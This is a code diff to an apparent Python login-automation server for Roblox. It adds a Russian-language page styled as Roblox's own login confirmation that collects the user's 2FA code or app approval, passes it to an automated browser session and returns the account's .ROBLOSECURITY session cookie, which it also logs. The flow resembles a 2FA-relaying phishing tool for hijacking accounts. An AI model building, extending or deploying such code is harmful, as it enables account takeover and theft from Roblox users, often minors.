@@ -186,7 +186,7 @@ def start_login(username, password, headless, wait=25):
         ch, media = bl.detect_challenge(driver)
         if ch == "2fa_code":
             with LOCK:
-                SESSIONS[sid]["status"] = "2fa"
+                SESSIONS[sid]["status"] = "2fa"; SESSIONS[sid]["mediaType"] = media
             return {"status": "2fa", "sid": sid, "mediaType": media}
         if ch == "2fa_push":
             with LOCK:
@@ -280,6 +280,7 @@ def submit_2fa(sid, code):
         u = bl.who_am_i(driver)
         if u:
             ck = _cookie(driver)
+            log("2FA ок: вошёл @%s (id=%s), cookie=%s" % (u.get("name"), u.get("id"), "есть" if ck else "нет"))
             _close(sid)
             return {"status": "ok", "account": _user_brief(u), "roblosecurity": ck}
         time.sleep(2)
@@ -329,6 +330,42 @@ function setup(enf){{enf.setConfig({{selector:'#arkose',mode:'inline',data:{{blo
 </div></body></html>""".format(blob=blob, sid=safe_sid, pk=ARKOSE_PUBLIC_KEY)
 
 
+_TWOFA_HTML = """<!doctype html><html lang="ru"><head><meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/><title>Подтверждение входа Roblox</title>
+<style>body{font-family:system-ui,Segoe UI,sans-serif;background:#0f1116;color:#e8eaed;display:flex;
+min-height:100vh;align-items:center;justify-content:center;margin:0}.card{background:#1a1d24;padding:26px;
+border-radius:14px;max-width:360px;width:92%}h1{font-size:1.12rem;margin:0 0 6px}p{color:#9aa0aa;font-size:.9rem;line-height:1.4}
+input{width:100%;box-sizing:border-box;padding:12px;font-size:1.3rem;letter-spacing:.3em;text-align:center;border-radius:10px;
+border:1px solid #2c313c;background:#0f1116;color:#fff;margin:8px 0}button{width:100%;padding:12px;border:0;border-radius:10px;
+background:#3b82f6;color:#fff;font-size:1rem;cursor:pointer;margin-top:6px}.sec{background:#2c313c}#ok{color:#34d399}#err{color:#f87171}</style>
+</head><body><div class="card"><h1>Подтверждение входа Roblox</h1>
+<p>Введите __HINT__. Если у вас подтверждение в приложении Roblox — одобрите вход на телефоне и нажмите «Я подтвердил».</p>
+<input id="code" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="6-значный код" pattern="[0-9]*"/>
+<button onclick="sub()">Подтвердить</button>
+<button class="sec" onclick="pl()">Я подтвердил в приложении</button>
+<p id="st"></p>
+<script>
+var SID="__SID__";
+function show(j){var e=document.getElementById('st');
+ if(j.status==='ok'){e.innerHTML='<span id=ok>Готово! Вход выполнен, можете закрыть страницу.</span>';}
+ else if(j.status==='pending'){e.innerHTML='Проверяем… если подтверждали в приложении — подождите пару секунд и нажмите ещё раз.';}
+ else{e.innerHTML='<span id=err>'+(j.error||j.status)+'</span>';}}
+function post(u,b){return fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)}).then(r=>r.json()).then(show).catch(e=>show({status:'err',error:String(e)}));}
+function sub(){post('/2fa',{sid:SID,code:document.getElementById('code').value});}
+function pl(){post('/poll',{sid:SID});}
+</script></div></body></html>"""
+
+
+def twofa_page(sid):
+    with LOCK:
+        s = SESSIONS.get(sid)
+    media = (s or {}).get("mediaType") or "authenticator"
+    hint = {"email": "код из письма на почте аккаунта", "authenticator": "код из приложения-аутентификатора",
+            "sms": "код из SMS"}.get(media, "6-значный код подтверждения")
+    safe_sid = "".join(c for c in (sid or "") if c.isalnum())
+    return _TWOFA_HTML.replace("__SID__", safe_sid).replace("__HINT__", hint)
+
+
 class Handler(BaseHTTPRequestHandler):
     def log_message(self, *a):
         pass
@@ -361,6 +398,9 @@ class Handler(BaseHTTPRequestHandler):
         if u.path == "/captcha":
             sid = (parse_qs(u.query).get("sid") or [""])[0]
             return self._html(200, captcha_page(sid))
+        if u.path == "/2fa":
+            sid = (parse_qs(u.query).get("sid") or [""])[0]
+            return self._html(200, twofa_page(sid))
         if u.path == "/health":
             return self._json(200, {"ok": True, "sessions": len(SESSIONS)})
         return self._json(404, {"error": "not found"})
